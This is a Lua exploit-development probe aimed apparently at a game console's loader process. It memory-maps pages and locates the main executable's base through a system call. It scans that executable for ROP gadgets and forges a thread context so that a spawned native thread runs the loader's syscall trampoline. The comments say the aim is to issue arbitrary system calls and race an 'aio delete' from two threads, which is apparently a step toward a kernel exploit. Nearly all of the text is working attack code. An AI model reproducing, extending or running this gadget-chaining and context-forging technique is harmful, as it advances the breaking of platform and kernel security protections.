-- CRASH_CLASS: HIGH
-- PROBE 712c: run the loader's own syscall trampoline from a thr_create child.
--
-- Context: syscall.pipe.fn_addr is a code address (this process: 0x808858B57),
-- and native.fcall_with_rax(fn_addr, N) performs syscall N from Lua. 712b tried
-- to read the bytes at that address and the read killed the process, which is
-- the signature of execute-only text (the same wall as libkernel.prx).
--
-- So do not read it - use it. The child is built exactly like 156d's working
-- child (which ran mov [rdi],rax; ret from eboot), except RIP is the trampoline
-- and RAX is the syscall number, with [rsp] holding a mov [rdi],rax; ret gadget
-- so the return value lands in a page we can read.
--
-- If this works, a child can issue any syscall, and two children can issue the
-- aio delete at once - the capability the Lua-side harness provably lacks.

print("=== PROBE 712c: native child on the loader trampoline ===")
print("")

local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function q(v) return string.format("0x%X", to_num(v)) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[A] fn_addr=" .. q(fn))
print("[A] control getpid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local sc_mmap = mk(477)
local page = 0x4000
local _, marker = pcall(function() return sc_mmap(uint64(0), uint64(page), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
local _, stack_base = pcall(function() return sc_mmap(uint64(0), uint64(page*4), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
local m = to_num(marker)
local sb = to_num(stack_base)
print("[A] marker=" .. q(m) .. " stack=" .. q(sb))
if m == 0 or sb == 0 then print("[A] mmap failed") return end
zero(m, page)

-- eboot gadgets: mov [rdi],rax; ret  and  jmp $ (EB FE)
local info = memory.alloc(0x200)
wd(info, 0x160)
local sc593 = mk(593)
pcall(function() sc593(uint64(0), uint64(info)) end)
local elo = rd(info+0x108) or 0
local ehi = rd(info+0x10C) or 0
local ebase = ehi*4294967296 + elo
print("[A] eboot=" .. q(ebase))
local size = 0x494000

-- read_buffer returns a raw Lua string, so one call covers 4 KiB and the search
-- is a plain string.find over binary-safe text (the dword-walk in 156d is ~200x
-- slower and once left the loader busy for over a minute).
local function find_pattern(base, limit, pat)
    local chunk = 0x1000
    local off = 0
    while off < limit do
        local n = math.min(chunk, limit - off)
        local ok, s = pcall(function() return memory.read_buffer(base + off, n) end)
        if not ok or type(s) ~= "string" then break end
        local pos = string.find(s, pat, 1, true)
        if pos then return base + off + pos - 1 end
        off = off + n - (#pat - 1)
        if n < chunk then break end
    end
    return nil
end

local C = {MAGIC=0x108, FLAGS=0x0D0, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
           RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}
local jmp_g = find_pattern(ebase, size, string.char(0xEB,0xFE))
local cands = {
    {pat=string.char(0x48,0x89,0x02,0xC3), reg=C.RDX, name="mov [rdx],rax;ret"},
    {pat=string.char(0x48,0x89,0x06,0xC3), reg=C.RSI, name="mov [rsi],rax;ret"},
    {pat=string.char(0x48,0x89,0x07,0xC3), reg=C.RDI, name="mov [rdi],rax;ret"},
}
local mov_g, mov_reg, mov_name
for _,c in ipairs(cands) do
    local g = find_pattern(ebase, size, c.pat)
    if g then mov_g, mov_reg, mov_name = g, c.reg, c.name break end
end
print("[A] " .. tostring(mov_name) .. "=" .. q(mov_g or 0) .. " jmp$=" .. q(jmp_g or 0))
if not mov_g or not jmp_g then print("[A] gadget missing") return end

local stack_top = sb + page*4 - 0x100
wq(stack_top, uint64(mov_g))
wq(stack_top+8, uint64(jmp_g))

local ctx = memory.alloc(0x500)
zero(ctx, 0x500)
wq(ctx+C.MAGIC, uint64(0x480))
wd(ctx+C.FLAGS, 0)
wq(ctx+C.TYPE, uint64(0x10000))
wq(ctx+C.CS, uint64(0x43))
wq(ctx+C.SS, uint64(0x3B))
wq(ctx+C.RIP, uint64(fn))
wq(ctx+C.RSP, uint64(stack_top))
wq(ctx+C.RDI, uint64(0))
wq(ctx+C.RSI, uint64(0))
wq(ctx+C.RDX, uint64(0))
wq(ctx+mov_reg, uint64(m))
wq(ctx+C.RAX, uint64(20))

local tid_buf = memory.alloc(8)
wq(tid_buf, uint64(0))
print("[B] spawning child: getpid via fn_addr ...")
local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tid_buf), uint64(0)) end)
print("[B] thr_create ok=" .. tostring(ok) .. " rv=" .. tostring(to_num(rv)) .. " tid=" .. q(rq(tid_buf) or 0))

local ts = memory.alloc(16)
wq(ts,0); wq(ts+8,400000000)
pcall(function() mk(240)(uint64(ts), uint64(0)) end)
local got = rq(m) or 0
print("[B] marker=" .. q(got))
print("[B] alive=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))
